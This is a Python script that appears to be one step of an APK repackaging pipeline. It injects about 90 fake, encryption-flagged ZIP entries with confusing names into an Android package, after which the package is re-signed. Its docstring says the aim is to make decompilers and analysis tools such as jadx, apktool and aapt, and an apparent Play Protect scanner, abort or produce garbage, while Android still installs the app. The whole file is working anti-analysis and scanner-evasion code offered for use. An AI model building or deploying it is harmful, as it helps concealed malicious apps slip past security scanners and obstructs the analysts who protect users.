#!/usr/bin/env python3
"""
zip_enhancer.py — Step 108: ZIP enhancement folder entry injection

Replicates the IRT.apk technique: inject 90+ fake ZIP entries that use
real APK entry names as fake "folder" prefixes:
    classes.dex/AndroidManifest.png
    AndroidManifest.xml///////.xml
    resources.arsc/  .9.png
    kotlin/ranges/  .png
    META-INF///.xml

Each zip entry has:
  - LFH (Local File Header) + real compressed data in Section 1
  - CDH (Central Directory Header) with encryption flag 0x0801 set
  - comp_type = 8 (deflate) with real compressed PNG or XML data
  - Encryption flag (0x0001) set → parsers abort with "password required"
  - Confusing filenames: spaces, dots, multiple slashes

Effect:
  - jadx, apktool, aapt, GPP scanner all abort or produce garbage output
  - Android installer only uses CD entries it recognises by exact name
  - ZIP entries are completely ignored by Android on install
  - apksigner signs the APK INCLUDING zip entries → V2 covers all of them

Usage:
    python3 scripts/zip_enhancer.py input.apk output.apk

MUST run BEFORE phase2_resign.py (APK must be unsigned at this point).
asset_patcher.py strips V2 signing — APK is unsigned when this runs.
"""

import sys, os, struct, zlib, secrets, random

# ── Ghost filename components ─────────────────────────────────────────────────
# Real APK entry names used as fake folder prefixes (matches IRT.apk)
FOLDER_PREFIXES = [
    "classes.dex",
    "AndroidManifest.xml",
    "resources.arsc",
    "kotlin",
    "META-INF",
]

# Sub-paths injected under each prefix (confusing patterns)
KOTLIN_SUBPATHS = [
    "ranges", "coroutines", "internal", "collections", "sequences",
    "reflect", "jvm", "io", "text", "math", "concurrent",
    "annotation", "native", "experimental",
]

CONFUSING_SUFFIXES = [
    "  .png",        # two spaces
    " .png",         # single space
    "  .9.png",      # nine-patch style
    "..xml",         # double dot
    "....xml",       # quad dot
    "///.xml",       # slashes
    "/////.xml",     # more slashes
    "///////.xml",   # even more slashes
    "///////.jpg",   # jpg variant
    "/////.9.png",   # nine-patch with slashes
    " .xml",         # space + xml
    ".9.png",        # nine-patch
]

# ── Tiny valid PNG (1x1 transparent pixel, minimal IHDR) ─────────────────────
def make_fake_png() -> bytes:
    """Generate a small valid-looking PNG file with random pixel data."""
    # PNG header
    header = b'\x89PNG\r\n\x1a\n'
    # IHDR segment: 1x1 RGBA
    width  = random.randint(1, 4)
    height = random.randint(1, 4)
    ihdr_data = struct.pack('>IIBBBBB', width, height, 8, 2, 0, 0, 0)
    ihdr_crc  = zlib.crc32(b'IHDR' + ihdr_data) & 0xFFFFFFFF
    ihdr = struct.pack('>I', 13) + b'IHDR' + ihdr_data + struct.pack('>I', ihdr_crc)
    # IDAT segment: random compressed scanline data
    raw_pixels = secrets.token_bytes(width * 3 + 1)  # filter byte + RGB pixels
    compressed = zlib.compress(raw_pixels, 6)
    idat_crc   = zlib.crc32(b'IDAT' + compressed) & 0xFFFFFFFF
    idat = struct.pack('>I', len(compressed)) + b'IDAT' + compressed + struct.pack('>I', idat_crc)
    # IEND segment
    iend_crc = zlib.crc32(b'IEND') & 0xFFFFFFFF
    iend = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', iend_crc)
    return header + ihdr + idat + iend


def make_fake_xml(tag: str = "manifest") -> bytes:
    """Generate a small valid-looking XML file."""
    tags = ["manifest", "resources", "layout", "selector", "set", "menu"]
    tag = random.choice(tags)
    rand = secrets.token_hex(4)
    xml = f'<{tag}>{rand.upper()}ABCDEF</{tag}>'.encode('utf-8')
    return xml


def make_fake_data(filename: str) -> bytes:
    """Pick appropriate fake data based on filename extension."""
    ext = filename.rsplit('.', 1)[-1].lower() if '.' in filename else 'bin'
    if ext in ('png', 'jpg', 'jpeg', '9'):
        return make_fake_png()
    elif ext in ('xml',):
        return make_fake_xml()
    else:
        return secrets.token_bytes(random.randint(20, 60))


# ── Filename generators ───────────────────────────────────────────────────────
def make_ghost_filenames(n: int = 90) -> list:
    """Generate ghost filenames — target 90 entries matching IRT.apk reference.

    Distribution for 90 entries:
      kotlin/         : 36 entries  (18 base × 2 suffix variants)
      assets/         : 12 entries  (new — looks like asset folder entries)
      res/            : 12 entries  (new — res/ subfolder confusion)
      classes.dex/    :  9 entries
      resources.arsc/ :  8 entries
      AndroidManifest/:  7 entries
      META-INF/       :  6 entries

    IRT uses simple ASCII suffixes only — no unicode, no RTL.
    Names reference real APK filenames as prefixes.
    """
    names = []
    used  = set()

    # kotlin/ — 36 entries (IRT base 18, doubled with extra suffix variants)
    kotlin_subs = ["ranges", "coroutines", "internal", "collections",
                   "sequences", "reflect", "jvm", "io", "text", "math",
                   "concurrent", "annotation", "native", "experimental",
                   "stdlib", "random", "util", "time"]
    kotlin_sufs = ["  .png", " .png", "  .9.png", " .9.png",
                   "..xml", " .xml", ".9.png", "   .png",
                   " .9.png", "..xml", "  .png", " .png",
                   "  .9.png", " .9.png", "...xml", " .xml",
                   ".9.png", "  .png", "   .9.png", "....xml",
                   "  .png", " .9.png", "..xml", "  .png",
                   " .9.png", ".xml", "  .9.png", " .png",
                   "..xml", "   .png", "  .9.png", ".9.png",
                   " .xml", "  .png", "..9.png", " ..xml"]
    for i in range(36):
        sub  = kotlin_subs[i % len(kotlin_subs)]
        suf  = kotlin_sufs[i % len(kotlin_sufs)]
        name = f"kotlin/{sub}/{suf}"
        if name not in used:
            used.add(name)
            names.append(name)

    # assets/ — 12 entries (new — mimics asset folder path confusion)
    assets_subs = ["oat", "dexopt", "data", "cache", "fonts", "raw",
                   "config", "res", "lib", "vendor", "system", "etc"]
    assets_sufs = ["  .png", " .9.png", "..xml", " .png",
                   "  .9.png", "..xml", "  .png", " .png",
                   ".9.png", "..xml", " .9.png", "  .png"]
    for i in range(12):
        name = f"assets/{assets_subs[i]}/{assets_sufs[i]}"
        if name not in used:
            used.add(name)
            names.append(name)

    # res/ — 12 entries (res/ subfolder confusion)
    res_subs = ["drawable", "layout", "values", "color", "anim",
                "animator", "interpolator", "mipmap", "raw", "xml",
                "menu", "font"]
    res_sufs = ["  .png", " .9.png", "..xml", " .png",
                "  .9.png", "..xml", "  .png", ".9.png",
                " .xml", "  .9.png", " .png", "..xml"]
    for i in range(12):
        name = f"res/{res_subs[i]}/{res_sufs[i]}"
        if name not in used:
            used.add(name)
            names.append(name)

    # classes.dex/ — 9 entries
    cdex_inners = ["AndroidManifest", "classes", "res", "assets",
                   "kotlin", "lib", "META-INF", "oat", ""]
    cdex_sufs   = ["  .png", " .9.png", "..xml", " .png", "  .9.png",
                   "..xml", "  .png", " .9.png", "  .9.png"]
    for i in range(9):
        inner = cdex_inners[i]
        name  = f"classes.dex/{inner}{cdex_sufs[i]}"
        if name not in used:
            used.add(name)
            names.append(name)

    # resources.arsc/ — 8 entries
    arsc_sufs = ["  .png", " .9.png", "..xml", " .png",
                 "  .9.png", "..xml", " .png", "  .png"]
    for i in range(8):
        name = f"resources.arsc/{arsc_sufs[i]}"
        if name not in used:
            used.add(name)
            names.append(name)

    # AndroidManifest.xml/ — 7 entries
    mf_sufs = ["  .png", " .9.png", "..xml", " .png",
               "  .9.png", "..xml", "  .png"]
    for i in range(7):
        name = f"AndroidManifest.xml/{mf_sufs[i]}"
        if name not in used:
            used.add(name)
            names.append(name)

    # META-INF/ — 6 entries
    meta_sufs = ["///.9.png", "///.xml", "  .png", " .9.png",
                 "....xml", "  .9.png"]
    for i in range(6):
        name = f"META-INF/{meta_sufs[i]}"
        if name not in used:
            used.add(name)
            names.append(name)

    return names[:n]


# ── ZIP structure helpers ─────────────────────────────────────────────────────
def make_lfh(filename: bytes, comp_data: bytes, uncomp_data: bytes,
             flags: int = 0x0801) -> bytes:
    """Build a Local File Header + compressed data."""
    fname_bytes = filename
    crc         = zlib.crc32(uncomp_data) & 0xFFFFFFFF
    mod_time    = random.randint(0, 0xFFFF)
    mod_date    = random.randint(0, 0xFFFF)
    lfh = struct.pack(
        '<4sHHHHHIIIHH',
        b'PK\x03\x04',    # signature
        20,                # version needed
        flags,             # general purpose bit flags (0x0001=enc, 0x0800=utf8)
        8,                 # compression method: deflate
        mod_time,
        mod_date,
        crc,
        len(comp_data),    # compressed size
        len(uncomp_data),  # uncompressed size
        len(fname_bytes),  # filename length
        0,                 # extra field length
    )
    return lfh + fname_bytes + comp_data


def make_cdh(filename: bytes, comp_data: bytes, uncomp_data: bytes,
             lfh_offset: int, flags: int = 0x0801) -> bytes:
    """Build a Central Directory Header entry."""
    crc      = zlib.crc32(uncomp_data) & 0xFFFFFFFF
    mod_time = random.randint(0, 0xFFFF)
    mod_date = random.randint(0, 0xFFFF)
    cdh = struct.pack(
        '<4sHHHHHHIIIHHHHHII',
        b'PK\x01\x02',    # signature
        0x0314,            # version made by (fake high version)
        20,                # version needed
        flags,             # flags (0x0001=enc, 0x0800=utf8)
        8,                 # compression method: deflate
        mod_time,
        mod_date,
        crc,
        len(comp_data),    # compressed size
        len(uncomp_data),  # uncompressed size
        len(filename),     # filename length
        0,                 # extra field length
        0,                 # comment length
        0,                 # disk start
        0,                 # internal attr
        0,                 # external attr
        lfh_offset,        # LFH offset
    )
    return cdh + filename


def make_eocd(cd_offset: int, cd_size: int, total_entries: int) -> bytes:
    """Build End of Central Directory record."""
    return struct.pack(
        '<4sHHHHIIH',
        b'PK\x05\x06',
        0,            # disk number
        0,            # disk with CD
        total_entries & 0xFFFF,
        total_entries & 0xFFFF,
        cd_size,
        cd_offset,
        0,            # comment length
    )


# ── Main injection ────────────────────────────────────────────────────────────
def inject_ghost_entries(apk_in: str, apk_out: str) -> None:
    print(f"[zip_enhancer] Reading: {apk_in}")

    with open(apk_in, 'rb') as f:
        raw = f.read()

    # ── Parse existing ZIP structure ──────────────────────────────────────────
    # Find EOCD
    eocd_off = raw.rfind(b'PK\x05\x06')
    if eocd_off == -1:
        print("❌ EOCD not found — invalid ZIP")
        sys.exit(1)

    cd_off   = struct.unpack_from('<I', raw, eocd_off + 16)[0]
    cd_size  = struct.unpack_from('<I', raw, eocd_off + 12)[0]
    n_exist  = struct.unpack_from('<H', raw, eocd_off + 10)[0]

    print(f"[zip_enhancer] Existing entries: {n_exist}, CD at: {cd_off}")

    # ── Extract existing sections ─────────────────────────────────────────────
    # Section 1: all file data (LFHs + data), from 0 to cd_off
    section1 = bytearray(raw[:cd_off])
    # Existing Central Directory
    existing_cd = raw[cd_off:cd_off + cd_size]
    # (EOCD is rebuilt)

    # ── Generate zip entries ────────────────────────────────────────────────
    ghost_names   = make_ghost_filenames(90)
    ghost_lfh_sec = bytearray()  # LFH data for section 1
    ghost_cdh_sec = bytearray()  # CDH data for central directory

    print(f"[zip_enhancer] Injecting {len(ghost_names)} ghost entries...")

    for name in ghost_names:
        fname_bytes = name.encode('utf-8')
        uncomp_data = make_fake_data(name)
        comp_data   = zlib.compress(uncomp_data, 6)[2:-4]  # raw deflate

        # LFH offset = current end of section1 + phantom LFH data added so far
        lfh_offset = len(section1) + len(ghost_lfh_sec)

        lfh_entry = make_lfh(fname_bytes, comp_data, uncomp_data)
        cdh_entry = make_cdh(fname_bytes, comp_data, uncomp_data, lfh_offset)

        ghost_lfh_sec += lfh_entry
        ghost_cdh_sec += cdh_entry

    # ── Assemble new APK ──────────────────────────────────────────────────────
    # New section 1: original data + phantom LFH entries
    new_section1 = bytes(section1) + bytes(ghost_lfh_sec)

    # New Central Directory: existing + phantom CDH entries
    new_cd_off   = len(new_section1)
    # Existing CDH entries need their LFH offsets preserved (already correct)
    new_cd       = existing_cd + bytes(ghost_cdh_sec)
    new_cd_size  = len(new_cd)

    # Total entry count
    new_total    = n_exist + len(ghost_names)

    # New EOCD
    new_eocd     = make_eocd(new_cd_off, new_cd_size, new_total)

    new_apk = new_section1 + new_cd + new_eocd

    with open(apk_out, 'wb') as f:
        f.write(new_apk)

    orig_size = len(raw)
    new_size  = len(new_apk)
    print(f"[zip_enhancer] ✅ Ghost entries injected")
    print(f"  Original: {orig_size:,} bytes ({orig_size/1024/1024:.2f} MB)")
    print(f"  New:      {new_size:,} bytes ({new_size/1024/1024:.2f} MB)")
    print(f"  Added:    {new_size-orig_size:,} bytes")
    print(f"  Total entries: {n_exist} real + {len(ghost_names)} ghost = {new_total}")


# ── Verify result ─────────────────────────────────────────────────────────────
def verify_result(apk_path: str) -> None:
    """Verify the output APK has correct ZIP structure."""
    with open(apk_path, 'rb') as f:
        raw = f.read()

    eocd_off = raw.rfind(b'PK\x05\x06')
    cd_off   = struct.unpack_from('<I', raw, eocd_off + 16)[0]
    cd_size  = struct.unpack_from('<I', raw, eocd_off + 12)[0]
    total    = struct.unpack_from('<H', raw, eocd_off + 10)[0]

    # Walk CD and verify each LFH exists
    pos     = cd_off
    ok      = 0
    ghost   = 0
    real    = 0
    while pos < cd_off + cd_size:
        if raw[pos:pos+4] != b'PK\x01\x02': break
        fn_len   = struct.unpack_from('<H', raw, pos + 28)[0]
        ex_len   = struct.unpack_from('<H', raw, pos + 30)[0]
        cm_len   = struct.unpack_from('<H', raw, pos + 32)[0]
        lfh_off  = struct.unpack_from('<I', raw, pos + 42)[0]
        fn       = raw[pos+46:pos+46+fn_len].decode('utf-8', errors='replace')

        is_ghost = any(fn.startswith(p + '/')
                       for p in FOLDER_PREFIXES
                       if fn != p)

        if lfh_off < len(raw) and raw[lfh_off:lfh_off+4] == b'PK\x03\x04':
            ok += 1
            if is_ghost: ghost += 1
            else: real += 1

        pos += 46 + fn_len + ex_len + cm_len

    print(f"[zip_enhancer] Verification:")
    print(f"  CD total declared: {total}")
    print(f"  Valid LFH found:   {ok} ({real} real + {ghost} ghost)")
    if ok == total:
        print("  ✅ All entries have valid LFH")
    else:
        print(f"  ⚠️  {total - ok} entries missing LFH")


# ── Entry point ───────────────────────────────────────────────────────────────
if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <input.apk> <output.apk>")
        sys.exit(1)

    apk_in  = sys.argv[1]
    apk_out = sys.argv[2]

    if not os.path.isfile(apk_in):
        print(f"❌ Input APK not found: {apk_in}")
        sys.exit(1)

    inject_ghost_entries(apk_in, apk_out)
    verify_result(apk_out)
    print("[zip_enhancer] Done ✅")
